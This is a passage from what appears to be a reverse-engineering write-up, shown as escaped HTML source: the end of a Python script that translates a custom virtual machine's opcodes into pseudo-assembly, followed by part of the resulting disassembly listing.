            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: my_xor v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        index &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; v21 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: mod v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        index &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; v21 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: my_or v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: my_or v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        index &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; v21 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: my_and v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: my_and v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        index &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; v21 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1A&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: push v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: push v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        index &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; v21 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1C&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: pop v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#39;&lt;/span&gt;)
        index &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; v21 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1E&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: shr v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: shr v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        index &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; v21 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: shl v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: shl v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        index &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; v21 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x22&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: ror v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: ror v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        index &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; v21 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x24&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: cmpl v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: cmpl v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        index &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; v21 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x26&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: cmpeq v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: cmpeq v23[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v5&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        index &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; v21 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; inloop &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: start_loop&amp;#39;&lt;/span&gt;)
            inloop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; inloop &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: end_loop&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
            inloop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; v21 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2A&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: judge&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
    index &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;转换结果&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assem&#34; data-lang=&#34;assem&#34;&gt;_0: lea_ch v23[1], v23[11]
_3: my_xor v23[3], v23[3]
_6: my_xor v23[0], v23[0]
_9: my_xor v23[4], v23[4]

_12: start_loop
_13: add v23[0], 51
_16: mod v23[0], 32
_19: lea_ch v23[9], v23[1]
_22: add_pch v23[9], v23[0]
_25: ldr_ch v23[10], v23[9]
_28: mov v23[4], v23[10]
_31: push v23[5], v23[4]
_34: add v23[3], 1
_37: cmpl v23[3], 32
_40: end_loop

_41: my_xor v23[0], v23[0]
_44: lea_int v23[8], v23[5]
_47: add_pint v23[8], 224
_50: lea_int v23[2], v23[8]
_53: ldr_int v23[10], v23[2]
_56: mov v23[0], v23[10]
_59: my_and v23[0], 224
_62: shr v23[0], 5
_65: mov v23[4], v23[0]
_68: my_xor v23[3], v23[3]

_71: start_loop
_72: ldr_int v23[10], v23[2]
_75: mov v23[0], v23[10]
_78: my_and v23[0], 31
_81: shl v23[0], 3
_84: push v23[5], v23[0]
_87: lea_int v23[8], v23[5]
_90: add_pint v23[8], 224
_93: lea_int v23[2], v23[8]
_96: ldr_int v23[10], v23[2]
_99: mov v23[0], v23[10]
_102: my_and v23[0], 224
_105: shr v23[0], 5
_108: pop v23[5], v23[10]
_111: add v23[10], v23[0]
_114: push v23[5], v23[10]
_117: add v23[3], 1
_120: cmpl v23[3], 31
_123: end_loop

_124: ldr_int v23[10], v23[2]
_127: mov v23[0], v23[10]
_130: my_and v23[0], 31
_133: shl v23[0], 3
_136: add v23[0], v23[4]
_139: push v23[5], v23[0]
_142: my_xor v23[3], v23[3]
_145: mov32 v23[4], v23[13]

_148: start_loop
_149: lea_int v23[8], v23[5]
_152: add_pint v23[8], 224
